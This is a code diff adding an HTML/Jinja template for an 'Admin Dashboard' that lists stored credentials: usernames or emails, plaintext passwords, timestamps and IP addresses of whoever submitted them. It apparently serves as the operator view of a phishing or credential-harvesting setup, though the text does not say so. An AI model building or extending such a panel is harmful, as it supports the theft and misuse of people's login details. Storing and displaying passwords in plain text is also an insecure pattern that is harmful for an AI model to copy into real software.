@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 min-h-screen">
+    <div class="container mx-auto p-6">
+        <div class="flex justify-between items-center mb-8">
+            <h1 class="text-3xl font-bold text-gray-800">Admin Dashboard</h1>
+            <a href="/logout" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded">Logout</a>
+        </div>
+        
+        <div class="bg-white rounded-lg shadow-md p-6">
+            <h2 class="text-xl font-semibold mb-4">Stored Credentials</h2>
+            
+            {% if credentials %}
+                <div class="overflow-x-auto">
+                    <table class="min-w-full bg-white">
+                        <thead>
+                            <tr class="w-full h-16 border-gray-300 border-b py-8">
+                                <th class="text-left pl-4">Email/Username</th>
+                                <th class="text-left pl-4">Password</th>
+                                <th class="text-left pl-4">Timestamp</th>
+                                <th class="text-left pl-4">IP Address</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for entry in credentials %}
+                                <tr class="h-16 border-gray-300 border-b">
+                                    <td class="pl-4">{{ entry.email }}</td>
+                                    <td class="pl-4">{{ entry.password }}</td>
+                                    <td class="pl-4">{{ entry.timestamp }}</td>
+                                    <td class="pl-4">{{ entry.ip_address }}</td>
+                                </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            {% else %}
+                <p class="text-gray-500">No credentials stored yet.</p>
+            {% endif %}
+        </div>
+    </div>
+</body>
+</html>
